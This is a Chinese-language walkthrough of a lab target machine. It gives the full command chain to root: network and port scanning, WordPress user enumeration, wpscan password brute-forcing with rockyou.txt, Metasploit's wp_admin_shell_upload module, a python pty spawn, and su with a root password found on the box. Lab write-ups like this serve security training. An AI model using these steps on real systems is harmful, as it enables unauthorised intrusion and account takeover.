靶机目标

获得root shell！

使用工具

kali，nmap，dirb，metasploit、wpscan

操作过程

1.首先扫描同网段下其余存活主机，我将靶机的网络模式改成nat模式，共享主机的ip，让靶机和主机在同一网段下，发现目标主机192.168.206.149:  arp-scan 192.168.206.1/24

2.扫描目标的端口及服务:  nmap -sV -p- 192.168.206.149

3.首先访问80端口

4.看到只是一个apache界面使用dirb扫描一下目录

5.发现靶机有wordpress框架,然后使用wpscan工具扫描这个框架.

wpscan --url http://192.168.206.149/wordpress -e ap -e at -e u


6.看到了一个用户c0rrupt3d_brain 然后继续使用工具爆破密码

wpscan --url http://192.168.34.153/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt


7.我们看到他的密码为24992499 接下来我们可以使用Metasploit的内置wordpress漏洞。首先，通过键入“ msfconsole”启动Metasploit，然后键入以下命令：

msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set RhOSTS 192.168.206.149
set USERNAME c0rrupt3d_brain
set PassWORD 24992499
set targeturi /wordpress
run

8.我们看到成功了，然后cd /home 下，看到有一个root3r的目录我们进去看一下

9.然后就看到了一个.root_password.ssh.txt的文件，查看一下

10.知道了root用户的密码开始提权，先建立交互式，创立一个tty终端

shell
python -c 'import pty;pty.spawn("/bin/bash")'
su root
willy26

思路总结

首先使用arp-scan扫描目标IP，然后使用nmap扫描目标端口，发现80端口，访问发现是Apache页面，之后使用dirb扫描目标的目录，通过路径发现可能存在wordpress的框架漏洞，然后用wpscan扫描wordpress的框架，发现用户名，然后爆破密码，使用metesploite攻击，拿到shell，查看home下的文件，找到root的密码，然后创建一个tty终端，切换到root权限，拿到root权限。
